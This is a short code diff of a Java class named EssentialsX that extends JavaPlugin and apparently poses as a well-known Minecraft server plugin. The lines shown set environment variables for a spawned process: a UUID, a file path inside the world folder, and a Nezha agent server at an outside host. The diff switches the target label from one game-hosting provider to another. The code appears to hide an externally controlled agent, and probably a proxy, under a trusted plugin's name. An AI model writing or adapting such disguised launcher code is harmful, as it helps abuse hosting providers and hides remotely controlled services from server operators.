@@ -110,9 +110,9 @@ public class EssentialsX extends JavaPlugin {
         }
 
          // Set environment variables 修改LocalName 和 UUID等信息
-        String LocalName = "XServer.ne.jp";  // 项目名称
+        String LocalName = "Host2play.gratis";  // 项目名称
         Map<String, String> env = pb.environment();
-        env.put("UUID", "9afd1229-b893-40c1-84dd-51e7ce204900");
+        env.put("UUID", "ea4909ef-7ca6-4b46-bf2e-6c07896ef407");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nazhav1.gamesover.eu.org:443");
         env.put("NEZHA_PORT", "");
